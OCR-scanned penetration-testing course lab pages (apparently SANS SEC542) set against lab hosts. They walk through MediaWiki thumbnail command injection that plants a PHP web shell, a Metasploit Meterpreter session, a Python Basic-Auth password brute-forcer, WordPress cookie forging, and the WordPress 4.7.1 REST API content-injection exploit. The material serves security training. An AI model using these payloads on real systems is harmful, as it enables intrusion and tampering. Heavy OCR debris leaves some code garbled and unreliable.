'-../ 
'-../ 
'---./ 
'---' 
'---' 
'-../ 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
4 
'-../ 
'-../ 
'---./ 
Log In to the Site 
In Firefox, go to http:/ /cust42.sec542.com/mwiki 
Click on "Log in" (upper right corner) 
Navigatfon 
Malnpage 
P.a1:ent dianges 
Random page 
Special pages 
Special page 
Log in / create account 
Log in 
Don't have an account? create an account. 
You must have cookies ;;mabled to log In to Expedltlon 42. 
usemame; I 
:========: 
Password: 
0 Remember my login on this browser (for a maximum of 180 days) 
c..,;......:...= Forgotten your login ctetaUs? 
Log in as: 
• 
Username: marvin 
• 
Password: paranoid 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
5 
Upload a PDF 
'--' 
The exploit requires a DjVu or PDF upload: 
• 
Exploitation triggered when the thumbnail of the uploaded image is generated 
• 
DjVu has failed for us, so we'll try a PDF 
Upload a PDF: 
• 
Click Upload file (under Tools on the menu on the left) 
• 
Click the "Browse ... " button 
• 
Click the pencil icon on the upper-left corner and browse to location: /opt/sqlmap/doc/FAQ.pdf 
02)03/2017 
190bytes 02/0312017 
02100!2017 
Bvidoos 
llelJic:es 
~ THANKS.md 
Z' MRO-PARTV.md 
• 
Click Open 
• 
Click "Upload file" (bottom left) 
• 
You should see "File:FAQ.pdf" and a preview of the sq I map FAQ 
Any PDF should work fine, we are using sqlmap's FAQ.pdf because the path is fairly short, and it worked 
well when tested. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
'--' 
'-../ 
'-../ 
'-" 
'-" 
'-" 
'-' 
'-' 
'-../ 
'-../ 
'-" 
'-" 
'-../ 
'--,/ 
'--,/ 
'-../ 
'-../ 
'-" 
'-../ 
'-../ 
'---' 
'-" 
'-../ 
"-...,· 
'--' 
'-" 
'-../ 
,__...,, 
'-../ 
'-../ 
'-../ 
'-../ 
'-" 
'--..,' 
'-" 
'-" 
'-" 
6 
'-" 
'---" 
,__...,, 
Manually Exploit the Vulnerability 
*WARNING*: The following is extremely difficult to type: 
• 
It contains single quotes and double quotes 
• 
And backticks ! 
-------, 
Enter the following URL in the Firefox address bar as one continuous line: 
http://cust42.sec542.com/mwiki/thumb.php?f=FAQ.pdf&w=l l'echo "<?php 
system (\\$_GET [ 1 cmd 
1 ] } ; 
>images/FAQ.php 
,-------._ 
We will break down this URL: 
Type the following sections as one contiguous line in the Firefox address bar. We have increased the font 
" 
for clarity: 
http://cust42.sec542.com/mwiki/thumb.php?f=FAQ.pdf&w=10I 
The first and last characters of the next section are backticks (not single quotes). The backtick character is 
below the <ESC> key on a US keyboard (upper left corner). Continue typing the following directly after the 
section you just typed, so it is one contiguous line as shown in the full URL above: 
.. echo "<?php system(\\$_GET['cmd']}; ?>">images/FAQ.php .. 
If you're stuck, we stashed a hint.txt file containing the full URL shown above at: 
http://cust42.sec542.com/mwiki/hint.txt 
If typing the URL above proves problematic, either use that file to compare your syntax and locate any 
typos, or simply copy and paste the URL in that file into Firefox's address bar. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
7 
Submit the URL 
'---' 
'---' 
We receive an error, but careful inspection shows that it is different than the error Metasploit received. 
The Metasploit error (shown via Burp during the author's testing) said: 
<html><head><title>Error generating thumbnail</title></head> 
<body><hl>Error generating thumbnail</hl> 
<p>The specified thumbnail parameters are not valid.</p> 
</body></html> 
The error we just received says (showing the page source from Firefox via CTRL-U): 
<html><head><title>Error generating thumbnail</title></head><body> 
<hl>Error generating thumbnail</hl> 
<p>Error creating thumbnail: /bin/bash: -: command not found<br /> 
convert.im6: option requires an argument '-resize'@ 
error/convert.c/ConvertimageCommand/2380.<br /> 
GPL Ghostscript 9.10: Unrecoverable error, exit code l<br /></p> 
</body></html> 
The error we received is more detailed, indicating that /bin/bash was called (which is a good sign for us), 
and a program (lmageMagick's convert program) was called. 
But did the exploit work? There's only one way to find out. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
'--' 
'--' 
'---' 
'---' 
'---' 
'-J 
'-J 
'---' 
'-" 
'---' 
'-../ 
'---' 
'-J 
'-" 
'-J 
'--' 
'--' 
'---' 
'---' 
'---' 
'-' 
'-' 
'---' 
'---' 
'-J 
'--' 
'---' 
'---' 
'-J 
'-J 
'-../ 
'-.../ 
,.__, 
'---' 
'-' 
'-J 
8 
'-J 
'-J 
'-J 
Happy pwning! ! ! 
Let's see if our PHP backdoor was uploaded successfully: 
,---._ 
• 
We'll try the id command 
In Firefox, surf to: 
http://cust42.sec542.com/mwiki/images/FAQ.php?cmd=id 
Success! 
Try the following URLs/commands as well, and feel free to freestyle and attempt others: 
http://cust42.sec542.com/ntwiki/images/FAQ.php?cmd=cat 
http: 
cust42 .s.ec542. com/mwiki/imagE!s/FAQ.php?cmd=ls 
Whenever we succeed using an exploit such as this, we also test to see if anyone else "beat us to the 
punch." View the images directory to see if other shells were dropped there previously. Verify the "home 
directory" of the PHP shell with the pwd (print working directory} command via this URL: 
http://cust42 .. sec542. com/mwiki/images/FAQ.php?cmd=pwd 
The script was uploaded to the images directory, so Is -la php will show all PHP scripts in that directory. 
Note: Do not include a dot("."} in "*php": 
http: //cust42. s.E!.c542. coin/mwiki/images/FAQ.php?cmd=ls -la *php 
As an added bonus: This will not only show other (potential} PHP shells and backdoors uploaded 
previously, but it will also show exactly when they were uploaded. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
9 
Back to Metasploit 
We already uploaded FAQ.pdf, so let's use that file. Go back to the msfconsole terminal and type: 
rnsf 
set FILENAME FAQ.pdf 
exnloit 
,,,,,.; ··.;;'-""''"" 
' 
,,,.........,, A= 
;e;x::;::w;;;;...,,_,,..,..,JU *w·0 
, ;;;.;;;;:;a;;;,,;;.:;;,, 
w·,= 
·,w ..... c9s.A1£ft;;;:;;t 
T 
X 
View Ierm!jit!~I ... Tabs 
Help 
..,,>;:,~'~#,4-'·'·"' 
Sending payload request .... 
~ 
Received response 588, exploit probably failed. 
Exploit completed, but no session was created. 
exploit ( mediai.wiki _ thmnb) > set FILENAME FAQ. pd f 
FILENAME=> FAQ.pdf 
msf exploit(mediawiki_thumb) > exploit 
Started reverse handler on 192.168.1.8:4444 
Grabbing version and login CSRF token ..• 
Sending payload request ... 
Sending stage (48499 bytes) to 192.168.1.8 
Heterpreter session 1 opened 092.168.1.8:4444 ·> 192.168.1.8:54441) at 2 
815·11·24 14:54:48 -9898 
meterpreter > I 
Happy pwning! ! 
Here are all of the commands, in case you accidentally closed the msfconsole window. Note you do not 
need to retype these if the preceding exploit was successful: 
$ cd /opt/metasploit-framework 
$ 
./msfconsole 
rnsf > use exploit/multi/http/mediawiki_thumb 
rnsf > set RHOST cust42.sec542.com 
msf > set USERNAME marvin 
set PASSWORD paranoid 
set TARGETURI /mwiki 
> set FILENAME FAQ.pdf 
> exploit 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 5.7: When Tools Fail 
'---" 
'V 
v 
'-..,I 
'---' 
'-../ 
'---" 
'---" 
'-..,I 
'---' 
'---" 
'-' 
-._, 
'---" 
'---" 
'---" 
'---' 
'---" 
'-..,I 
'-' 
'---' 
'--' 
'---" 
'---" 
'---' 
'---" 
'--' 
'---' 
'-..,I 
'---" 
'---" 
'---' 
'--' 
'-..,I 
'-..,I 
'---' 
'---' 
'-' 
___, 
'---' 
10 
'--' 
'---" 
'---' 
;.· 
. ,~~1z..silifri~11.'(lix -¥~eJrws·~~nent1~i. ······· 
·· .. ··. 
00 -~-- 
¥ 
-- 
..,,__ 
--~ 
> __ _,_;:; ~=- - 
_- _ 
~ - - 
~ 
- ~ 
_ 
o 
::--= _ ~ - 
~ 
_ : - 
~ 
= 
- 
jcha/lenges 
Note: These are advanced challenges, designed to challenge more experienced students. They lack 
some of the step-by-step/screenshot-by-screenshot instructions the main labs feature. 
1. Write a Python script to launch a John-the-Ripper style hybrid password guessing attack against a 
website using Basic Authentication 
2. Write a Python script to automate the high score submission in the Snake game we played on day 1, 
repeatedly submitting slightly higher scores, achieving a listed high score of at least 10,000 
3. 
Review the "Cookie Review" section from the Word Press lab (second-to-the-last slide in the lab). Then 
log out of Word Press, manually recreate the cookies, and access the site as an authenticated user 
without authenticating again. 
4. 
Discover and exploit a vulnerability announced in 2017 vs. WordPress 4.7.1. The site 
http://www.sec542.org/wordpress-471/ is vulnerable. Your challenge is to alter an existing post as an 
unauthenticated user. 
Details and walkthroughs follow for all challenges. 
!challenge 1 Details 
Write a Python script to perform a hybrid password guessing attack against a website using Basic 
authentication and automatically detect successful authentication. 
• 
Site: http://www.sec542.org/basic/ 
• 
Username: ford 
• 
Password list: /opt/wordlists/splashdata-worst-passwords-2016.txt 
" 
• 
Append two of the following characters to each password: 1234567890!@#$%A&*()_+= 
o 
In other words, append '11' through'==', and all combinations in between 
" 
Hints begin on the next page, and complete code follows the hints. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
1 
[ Challenge 1 Hints 
Write a Python script to perform a hybrid password guessing attack against a website using Basic 
authentication and automatically detect successful authentication. 
• 
Site: http://www.sec542.org/basic/ 
• 
Username: ford 
• 
Password list: /opt/wordlists/splashdata-worst-passwords-2016.txt 
• 
Append two of the following characters to each password: 1234567890!@#$%A&*()_ += 
o 
In other words, append '11' through '==', and all combinations in between 
o 
For example (password of "password"): 
• 
passwordll 
• 
password12 
• 
• 
password== 
The 542.5 Python lecture (in the section called "Python for Web App Pen Testers") contains all the code 
snippets required to complete this step. We will cite slide names (instead of slide numbers) because slide 
numbers often change, and we'd like to avoid dependencies. 
• 
The slide titled "Requests" shows the code that performs basic authentication. 
• 
The "Python Loops" slide contains more helpful information (be sure to check the notes as well) 
• 
The "Putting (a Lot of) It Together" slide shows how to read a file and iterate through each line (as 
you will with /opt/wordlists/splashdata-worst-passwords-2016.txt 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
'-.../ 
'-.../ 
'-' 
'-' 
'-.../ 
'-' 
'-.../ 
'-.../ 
'--./ 
'-' 
'---' 
'-' 
'-' 
'---' 
'-.../ 
'-.../ 
'--./ 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-' 
'---' 
'-' 
'--./ 
---- 
'-' 
'-' 
'-' 
'--./ 
'--./ 
'-' 
'-' 
'-' 
'-' 
'-' 
'--./ 
2 
'-' 
'-' 
'-' 
Challenge 1 Answer 1 
This version of the script avoids the use of a Python function (for the sake of simplicity) and keeps running 
after r. status_code==200. We would normally break after that: In other languages, a break would exit all 
loops, but the Python break statement only exits the closest loop. A return from a function is recommended 
for break-like functionality. The next page shows a version that uses a function. 
A copy of this script (with additional comments) is in /home/student/Desktop/python/bonuschallengel-1.py 
#!/usr/bin/python3 
import requests 
~ 
characters="1234567890!@#$%A&*() +=" 
user="ford" 
with open('/opt/wordlists/splashdata-worst-passwords-2016.txt') as f: 
passwordlist = f.read() .splitlines() 
for basepassword in passwordlist: 
for charl in characters: 
for char2 in characters: 
password=basepassword+charl+char2 
r = requests.get('http://www.sec542.org/basic',auth=(user,password)) 
if(r.status code==200): 
print(str(r.status_code)+11:11+user+11:11+password) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
3 
I Challenge 1 Answer 2 
'--./ 
'-' 
This version of the script uses a custom Python function to return immediately after r. status code==200. 
A copy of this script (with additional comments) is in /home/student/Desktop/python/ bonuschallengel-2.py 
#!/usr/bin/python3 
import requests 
def connect(): 
characters="1234567890!@#$%A&*() +=" 
user="ford" 
with open('/opt/wordlists/splashdata-worst-passwords-2016.txt') as f: 
passwordlist = f.read() .splitlines() 
for basepassword in passwordlist: 
for charl in characters: 
for char2 in characters: 
password=basepassword+charl+char2 
r = requests.get('http://www.sec542.org/basic',auth=(user,password)) 
print(str(r.status_code)+":"+user+":"+password) 
if(r.status_code==200): 
return 
connect () 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
'-..../ 
'-' 
'-../ 
'-..../ 
'-..../ 
\.._./ 
'-..../ 
\__.., 
\.._./ 
\.._./ 
'-' 
'-' 
'-..../ 
'-.../ 
'-..../ 
'-../ 
'-..../ 
'---" 
'-../ 
'-..../ 
'-' 
'--' 
'-../ 
'-../ 
'-..,I 
'-..../ 
'-../ 
'-../ 
'-..../ 
'-../ 
'--' 
'-../ 
'-../ 
'-..../ 
'---" 
'-../ 
4 
'--"' 
'-' 
'-' 
I Challenge 2 Details 
Write a Python script to automate the high score submission in the Snake game we played on day 1, 
repeatedly submitting slightly higher scores, achieving a leaderboard score of at least 10,000. 
,,.---.., 
URL: http://www.sec542.org/snake/ 
In other words, do this (feel free to select the name of your choice): 
,--., 
Hints follow this section, and complete code follows the hints. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
5 
[challenge 2 Hints 
Write a Python script to automate the high score submission in the Snake game we played on day 1, 
repeatedly submitting slightly higher scores, achieving a listed high score of at least 10,000. 
URL: http://www.sec542.org/snake/ 
A few notes on the (strange) internal logic of the Snake game: 
• 
As you probably noticed during 542.1, a new high score is always +l, regardless of the actual score 
• 
If the current score is 2501, and the new score is set to 10,000, the new high score is ... 2502 
o 
Strange, we agree 
o 
Note: We didn't write this code 
o 
As a wise person once said: "It's not a bug, it's a feature!" 
• 
There is a related "feature," which makes this challenge much easier: 
o 
If you resubmit the same score of 10,000, the new high score will be ... 2503 
o 
Do it again, and the new high score is 2504 
o 
Etc .... 
o 
Until you reach 10,001 (yes, it is +1 from the actual score, again due to internal logic) 
Inspect the slide titled "POST via Requests" carefully (including the notes). Also, see the "Python Loops" 
slide and notes as well. 
More specific hints for Challenge 2 follow on the next page. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
1...../ 
\._./ 
1...../ 
'-" 
"--' 
\._./ 
...___,, 
...___,, 
\._./ 
'---' 
...___,, 
'---' 
...___,, 
...___,, 
\._./ 
'-.., 
...___,, 
\._./ 
\._./ 
'--" 
\._./ 
'---' 
'--" 
...___,, 
...___,, 
...___,, 
...___,, 
'--" 
...___,, 
'--" 
\._./ 
'-" 
\._./ 
\._./ 
\._./ 
'-.J 
...___,, 
...___,, 
'-" 
6 
\._./ 
'--J 
'-.., 
I Extra Challenge 2 Hints 
These Snake score 'features' make the Python script easier to write: 
• 
Proxy Firefox via ZAP 
• 
Score any points in Snake 
• 
Save the body of the POST containing score and scorehash to a file 
o 
Remember: scorehash = (score*score) + 1337 
• 
Manually edit that file, changing score to 10,000 and scorehash to be (10000*10000)+1337 
• 
Write a Python script to loop up to 10,000 times (depending on the current high score) 
o Then POST from the file 
"' 
You can read a file into a variable with this code: 
postfile=open(1/home/student/Desktop/python.snake-post.txt1, 1r1) 
postdata = postfile.read() 
"' 
Note: Extra submissions don't harm anything, so don't sweat the "up to 10,000 times" detail too much. 
Spoiler alert: Complete code follows on the next slide. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
7 
'-../ 
I Challenge 2 Answer 
Note: The file /home/student/Desktop/python/snake-post.raw already exists, and you may use that. If you'd 
like to create your own POST file, perform the following steps: 
• 
Proxy Firefox via ZAP 
• 
Score any points in Snake 
• 
Save the body of the POST containing score and scorehash to a file: 
o 
Click on the POST to enterHighscore.php 
o 
Click the "Request" tab 
o 
Right-click on the POST text, and choose "Save Raw"-> "Request"-> "Body" 
o 
Save as: /home/student/Desktop/python/snake-post.raw 
Default Context 
"w fil Sites 
,. 
l1JI http;/twww.sec542.org 
POST http: //wi.. secsez, org/snake/enterHighscore. php HTTP /1. 1 
User-Agent: NoziUa/5,0 (XU; Ubunto; Linux i686; rv:50.0} Gecko/20100101 Firefox/50.0 
Accept; text/html, app lication/xhtml+xm l, app lication/x11 l; q=O. 9, */*; q=<e. s 
Accept-Language: en-US.en;q .. o.5 
Connection: keep-alive 
Content-Type: app lication/x ·VWW· tcra-urtencoded 
Cont1rnt-Length: 3344 
,--------------~ 
Host: 'ft"II. sec 542. orq 
I 
Find... 
1 
Em:ode/Decode/Hash ... 
Run application 
Resend ... 
Open URL in Browser 
Vlew 
.. 
-----·-···---·----···----- ------ 
!,!n,::k, 
fS,:dO 
4 09/01117 ll,,.. 
GET 
http,/twww.sec542.org{snake/h!ghscores 
Then edit the file and: 
• 
Change the score value to: score=lO000 
• 
Change the scorehash value to: scorehash=100001337 
A copy of this script is in /home/student/Desktop/python/bonuschallenge2.py 
ldl highsco res- 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
'-../ 
\._,, 
'--' 
'-' 
'-' 
'-../ 
'--' 
'--' 
'--' 
'-../ 
'-../ 
'-../ 
'--' 
\._,, 
'--' 
'--' 
\._,, 
'-../ 
'-../ 
'-" 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
'-" 
'-" 
'-../ 
'--' 
'-" 
'-../ 
'-../ 
'-../ 
'-' 
'--' 
..__,, 
'--' 
'--' 
8 
'--' 
'--' 
'--' 
Note that this script assumes the POST was saved to /home/student/Desktop/python/snake-post.raw (as 
described in the steps above). We saved an example to /home/student/Desktop/python/snake- 
post.raw.example 
~ #!/usr/bin/python3 
import requests 
postfile=open('/home/student/Desktop/python/snake-post.raw', 'r') 
postdata = postfile.read() 
for x in range(0, 10000): 
headers= {'content-type': 
'application/x-www-form-urlencoded'} 
r=requests.post('http://www.sec542.org//snake/enterHighscore.php',data=postdata,headers=headers) 
print (r.text) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
9 
I Challenge 3 Details 
'---' 
'---' 
Review the "Cookie Review" section from the WordPress lab (second-to-the-last slide in the lab). 
Log in to WordPress: 
• 
Site: http://www.sec542.org/wordpress/wp-login.php 
• 
Username: admin 
• 
Password: foobar 
View the cookies that begin with "wordpresspass_" and "wordpressuser _". 
Rerun 3960.php and save the output to a text file. You need two lines to complete this challenge: "cookie 
suffix" and "Final result". 
Then log out of Word Press, manually recreate the cookies, and access the site without authenticating 
again. 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---" 
'---" 
'---" 
'--' 
A complete walkthrough follows in the next section. 
.__,, 
'---" 
\,__,I 
\,__,I 
\,__,I 
.__,, 
.__,, 
\,__,I 
'--' 
'--' 
'---' 
'---" 
'---" 
. .____, 
'---" 
.__,, 
'---" 
'---' 
.__,, 
--.__/ 
'----" 
'--' 
'----" 
\,__,I 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
10 
\__/ 
'---" 
'---" 
I Challenge 3 Answer 
If you have completed the Word Press lab, you may skip steps 1 and 2 since they are already complete. 
Otherwise complete steps 1 and 2: 
~ 
1. $ cp /opt/exploit-database/platforms/php/webapps/3960.php /home/student 
Edit /home/student/3960.php and change $url to: 
2. $url = 
'http://www.sec542.org/wordpress/wp-admin/admin-ajax.php'; 
3. Log out of Word Press (if you have not done so already). 
4. Rerun /home/student/3960.php, and tee the output to /tmp/3960.txt. The Linux 'tee' command sends the 
output to both the screen and a file. 
$ php /home/student/3960.php I 
tee /tmp/3960.txt 
5. grep the 'cookie suffix' value from /tmp/3960.txt: 
$ grep cookie /tmp/3960.txt 
cookie suffix: c824d0d8c538ab2ba06a35095c8dd02d 
6. Open Firefox and use the Cookies Manager+ plugin to create the two cookies. 
Copy 
I e 
Paste 
100% 
+ 
ll 
New Window 
New Private 
Window 
Print 
History 
p 
0 
Frnd 
Pmfenmc:es 
save Page 
Ai. 
'4C., • 
Fu!i Screen 
Add-ons 
Developer 
Cookies Man- 
a 
Synced Tabs 
7. Copy the cookie suffix value shown in the grep command (c824d0d8c538ab2ba06a35095c8dd02d). You may 
highlight the value use the Edit->Copy menu to copy the cookie from the terminal. You will next paste the 
cookie suffix after "wordpressuser_" 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
11 
8. Press "New Cookie" and create the cookie: wordpressuser _c824d0d8c538ab2ba06a35095c8dd02d 
• 
Name: wordpressuser_c824d0d8c538ab2ba06a35095c8dd02d 
• 
Content: ad.min 
• 
Host: www. sec542. org 
• 
Path: /wordpress/ 
Then save the cookie. 
+ X 
9. grep the "Final result" value from /tmp/3960.txt: 
$ grep result /tmp/3960.txt 
Final result: user_pass=3858f62230ac3c915f300c664312c63f 
10. Copy the result and generate the mdS checksum of the result value: 
$ echo -n 3858f62230ac3c915f300c664312c63f 
I 
mdSsum 
9e71fc2a99a71b722ead746b776b25ac 
11. Press "New Cookie" and create the cookie: wordpresspass_c824d0d8c538ab2ba06a35095c8dd02d 
• 
Name: wordpresspass c824d0d8c538ab2ba06a35095c8dd02d 
• 
Content: 9e71fc2a99a71b722ead746b776b25ac 
'-..../ 
• 
Host: www.sec542.org 
• 
Path: /wordpress/ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
\-....,/ 
'-..../ 
\-....,/ 
'-..../ 
'-..../ 
\....,/ 
\....,/ 
'-..../ 
'-' 
'-..../ 
'-' 
'-' 
\....,/ 
\-....,/ 
'-' 
\-....,/ 
'.J 
'-' 
\....,/ 
..._,, 
..._,, 
'-' 
'-' 
'-..../ 
'-..../ 
'--' 
'-..../ 
'-..../ 
..._,, 
'-..../ 
'-..../ 
'-' 
\....,/ 
'-.../ 
'-' 
\....,/ 
12 
'-' 
'-..../ 
'-' 
Then save the cookie. 
l 
f 
12. In Firefox go to Exercises Tool bar-> Word press Admin. If you followed the previous steps correctly, you 
will be logged in (note "Howdy, admin" in the upper right corner): 
Welcome to WordPress 
Use these links to get started: 
• Write a post 
• Update your profile or ch,mge )'OUT password 
• Add a bookmtu'k y,your hlOJlroll 
• ½ha1!_9B your site's look: or theme 
Need help vdth Worol'ress? Please see our documenmtkm or \<isil tl:e 
!"l'.l."'.rt_f<>!'llmll· 
.... 
Word.Press Development Blog 
Word.Press 4.1 "Dinah" - 788 days ago 
Latest Activity 
Posts» 
.- ~tau,. I wi$h. I bad more thrti .. x 
• l___tµl_~y __ fi9~· .. ~)T~:Y~i.nJ1 .. ~~~~-f1Jt~.!~ 
Blog: Stats 
Th-ere are t'.!Urt"fflttiy 2 ~ and. o eomn1aG.nts_., ~tallted 
within -i (:at~. 
¼lr,;mn 4.t of WorttPross,. named "Dinah" in honor of jezz sin,wr Dinah Washington, is ava.1l.>ble f<>r download or update in your 
WordPress dashboard. New fe<1tun1s in WordPro~, ,t 1 help you forns on your writing, a.nd t.lJ.a new default theme lets you show it off 
in st}ie. lntrodm;ing:iwenty Fifteen Our ,wwest default lhernll, Twenty Fifteen,, is ['-.l 
Word]'ressj.H.ekase C1ndidaj - 789 days ago 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
13 
I Challenge 4 Details 
Discover and exploit a vulnerability announced in 2017 vs. Wordpress 4.7.1. The site 
http:/ /www.sec542.org/wordpress-471/ is vulnerable. Your challenge is to alter an existing post as an 
unauthenticated user. 
Note: This is a new site, with a separate directory and database structure from the previous /wordpress/ 
exercises. 
Surf to this URL in Firefox, and view the latest post as an unauthenticated user: 
http://www.sec542.org/wordpress-471/ 
Scroll down to see the following: 
POSTS 
fEIH!UARY LL 2(H7 
This post is unhackable!l 
Good luck hacking this post- this site is wicked secure! 
Use the following tools to diagnose and exploit the vulnerability: 
• 
/opt/wpscan/wpscan.rb 
• 
/opt/exploit-database/searchsploit 
This challenge requires an existing post ID; the following curl command is helpful: 
$ curl http://www.sec542.org/wordpress-471/wp-json/wp/v2/posts 
A complete walkthrough follows in the next section. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
..__, 
'--' 
v 
'-../ 
'-../ 
'-../ 
'--' 
'-.../ 
'-.../ 
'--' 
'--' 
'-.../ 
'--' 
'-../ 
'-.../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'--' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
\..J 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-.../ 
'-../ 
'-../ 
\..J 
14 
'-./ 
'-./ 
\..J 
Run wpscan against the new site: 
------ 
$ /opt/wpscan/wpscan.rb --url http://www.sec542.org/wordpress-471/ 
This screenshot contains the vulnerability details (scroll up to see this section}: 
Title: WordPress 4.7.0-4.7.1 - Unauthenticated Page/Post Content Modification via REST API 
Reference: https://w;pvulndb.com/vulnerabilities/8734 
Reference: https : //blog. sueurf 
.. net/2017 /02/content-injection-vulnerability-wordpress- rest 
. html 
Reference: https: //blogs .akamai .com/2017/82/wordpress-welHlPi-vulnerabiUty. html 
Reference: https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab 
Reference: https://github.com/WordPress/WordPress/commitle357195ce3G3017d517aff944644a7a1232926f7 
Reference: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress content injection 
[il Fixed in: 4.7.2 
- 
- 
Search exploit-database for a matching exploit. Note that the exploits are sorted from oldest to newest, and 
this exploit is among the newest: 
,..----._ 
$ /opt/exploit-database/searchsploit wordpress 
You may also search for "4.7.1" to narrow down the results: 
,......___ 
$ /opt/exploit-database/searchsploit wordpress 4.7.1 
l 
Path 
I 
(/opt/exploit-database/platforms) 
- Unauthenticated Content 
ection (Python} I /linux/webapps/41223. 
· Unauthenticated Content 
ect ton (Ruby) 
I /linux/webapps/41224. 
Plugin Insert PttP ~ PHP Code Injection 
I /php/webapps/41368.txt 
' 1- 
.. 
, .. - 
- 
- - ...... 
LL:J$ l~rJ 
_ 
The ruby "Unauthenticated Content Injection" exploit works well. It requires a post ID, which may be 
determined with this curl command: 
$ curl http://www.sec542.org/wordpress-471/wp-json/wp/v2/posts 
I 
less 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
15 
.._...,, 
[{"id":4,"date":"28l7·82·l3T14:20:47","date_gmt":"2017·&2-l3T14:20:47","guid":{ 
:"http:\/\/www.sec542.org\/wordpress-47l\/?p"'4"},limodified":"2017-02-l 
:37:'f.l2","modified_gmt":"2017·02·13Tl7:37:e2","slug":"this·post-is-unhackable" 
: "post ", "Unk": "http:\/\/www.sec542.org\/wordpress-47l\/this-post-is-unha 
,"title'': 
rendered'':"This post is unhackable!!" ,"content":{''rendered" 
:"<p>Good luck 
this post &#8211; this site is .-u,'-""'" secure!<\/p>\n","pr 
:false},"excerpt":{"rendered": .::o:>uc1oa luck hacking this post &#8211; th 
site is wicked secure! <\/p>\n*', "protected": 
, "autnor ": 
"featured media" 
:8,"comment status":"open","'ping status":"open", 
"template":"","fo 
: "standard", "meta": IJ, "categories": f 1], "tags'': fl, _links": {"self''; [{''href'': 
''http: \/\/www. sec542. org\/wordpress-411 \/wp-j scm\/wp\/v2\/posts\/4"} J, "cot lecti 
{ {"href": "http:\/\/www. :sec542 .org\/wotdpress~47l\/wp-json\/wp\/v2\/posts 
, 
.._...,, 
"--' 
"--' 
.._...,, 
.._...,, 
.._...,, 
.._...,, 
.._...,, 
.._...,, 
Post ID 4 ('"id" : 4' in the upper left corner) contains the subject "This post is unhackable!" We will hack that 
post. Run the following command (type the bolded portions): 
$ ruby /opt/exploit-database/platforms/linux/webapps/41224.rb 
Enter Target URI (With wp directory) 
http://www.sec542.org/wordpress-471 
Enter Post ID 
4 
Done! 
'http://www.sec542.org/wordpress-47l/index.php?p=4' 
[-] $ ruby /opt/ exploit - database/plat f o rms/linux/webapps/ 41224 .. rb 
Enter Ta 
URI (With wp directory) 
http: //www.sec542.org/wordpress-471 
r Post IO 
OonE::i! 
1 
://1Wv1w.sec542.org/wordpress-47 
.php?p=4' 
]$ 
Surf to this URL in Firefox again, and view the altered post as an unauthenticated user: 
http://www. sec542. org/wo rd p ress-4 71/ 
If Firefox is already open on this page from a previous step, simply reload the page. Scroll down to see the 
following: 
'-./ 
'-./ 
'-./ 
'-./ 
.._...,, 
'-.../ 
.._...,, 
'-./ 
.._...,, 
'-./ 
'-J 
'-' 
.._...,, 
'-./ 
'-- 
.._...,, 
.._...,, 
'-./ 
'-' 
'-./ 
'-' 
'-' 
'-./ 
.._...,, 
'-./ 
'-./ 
'-J 
'-../ 
'--' 
.._...,, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
16 
.._...,, 
'-' 
'--' 
POSTS 
You have been hacked 
Hacked please update yourwordpress version 
The following one-line curl command contains the exploit (type as one continuous line). This command will re- 
alter post 4 with the title and content of your choice: 
$ curl --data "id=4xxxxx&title=PWNED&content=Epic PWNAGE" 
http://www.sec542.org/wordpress-471/index.php/wp-json/wp/v2/posts/4 
This requires "id=4" followed immediately by a bunch of non-numbers (five x's in this case), and URL must end 
in the same id (4). 
Reload the following page in Firefox: http://www.sec542.org/wordpress-471/ 
Scroll down to see the following: 
POSTS 
PWNED 
EpicPWNAGE 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Bonus Challenges 
17 
- 
::, 
> 
~- 
=~~ 
- 
' 
~ 
- - 
- 
~ 
~=- Allfiend.J~:-P· ~ ·--:- Vz.lW]wan~ BnidgedA~ode·IMow~ To --- :2 
- :: 
~ =::::- 
- 
~ 
~ - 
- ~~ 
~- 
::: 
~ 
~ ~ 
This Appendix is designed to assist with common problems with VMware's automatic bridging feature. 
If you have not done so already, please get an Ethernet cable, plug in to the wired network, and ensure you 
have connectivity. Your switch port should show blinking lights. 
Next, force your bridged connection to use the wired adapter. VMware's automatic bridging feature is 
notoriously unreliable and often chooses wireless instead of wired. Even if it initially automatically bridges 
correctly, it often changes adapters later, causing problems later. 
Three sections follow, for VMware Player, VMware Workstation, and VMware Fusion. Choose the appropriate 
section based on your version of VMware and configure bridged networking. 
